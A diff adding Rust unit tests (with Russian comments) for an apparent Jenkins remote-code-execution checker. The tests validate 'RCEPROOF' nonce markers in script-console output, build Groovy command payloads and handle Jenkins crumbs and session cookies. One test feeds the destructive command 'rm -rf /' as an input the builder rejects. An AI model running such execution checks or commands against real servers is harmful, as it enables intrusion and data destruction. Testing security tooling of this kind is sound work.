+            let body = format!("<pre>RCEPROOF_abc123:uid=0(root) {marker}</pre>");
+            assert!(
+                validate_proof(&resp(200, &body), "id", "abc123", true).is_none(),
+                "marker {marker} должен отклоняться"
+            );
+        }
+    }
+
+    #[test]
+    fn accepts_valid_proof_from_pre_only() {
+        let body = "<html><div>шум</div><pre>RCEPROOF_abc123:uid=1000(user) gid=1000</pre></html>";
+        let proof = validate_proof(&resp(200, body), "id", "abc123", true).unwrap();
+        assert_eq!(proof, "uid=1000(user) gid=1000");
+    }
+
+    #[test]
+    fn ignores_non_pre_body_on_script_endpoint() {
+        // Баг №1: proof не должен браться из произвольного тела (не <pre>).
+        let body = "RCEPROOF_abc123:uid=0(root)";
+        assert!(validate_proof(&resp(200, body), "id", "abc123", true).is_none());
+        // А для /scriptText text/plain допустим.
+        assert!(validate_proof(&resp(200, body), "id", "abc123", false).is_some());
+    }
+
+    #[test]
+    fn rejects_wrong_nonce_and_wrong_command_shape() {
+        let body = "<pre>RCEPROOF_abc123:uid=0(root)</pre>";
+        assert!(validate_proof(&resp(200, body), "id", "different", true).is_none());
+        let body2 = "<pre>RCEPROOF_abc123:garbage output</pre>";
+        assert!(validate_proof(&resp(200, body2), "id", "abc123", true).is_none());
+        assert!(validate_proof(&resp(200, body2), "date", "abc123", true).is_some());
+    }
+
+    #[test]
+    fn nonce_in_groovy_allows_recrosscheck() {
+        let g = groovy_for("whoami", "deadbeef").unwrap();
+        assert!(g.contains("RCEPROOF_deadbeef:"));
+        assert!(g.contains("whoami"));
+        assert!(groovy_for("rm -rf /", "x").is_none());
+    }
+
+    #[test]
+    fn crumb_parse_and_cookie_merge_keep_session() {
+        let crumb = parse_crumb(r#"{"crumb":"abc","crumbRequestField":"Jenkins-Crumb"}"#);
+        assert_eq!(crumb, "abc");
+        let mut cookie = String::new();
+        merge_cookie(&mut cookie, "JSESSIONID=old; Path=/".to_string());
+        merge_cookie(&mut cookie, "JSESSIONID=new; Path=/".to_string());
+        assert_eq!(cookie, "JSESSIONID=new");
+    }
 }
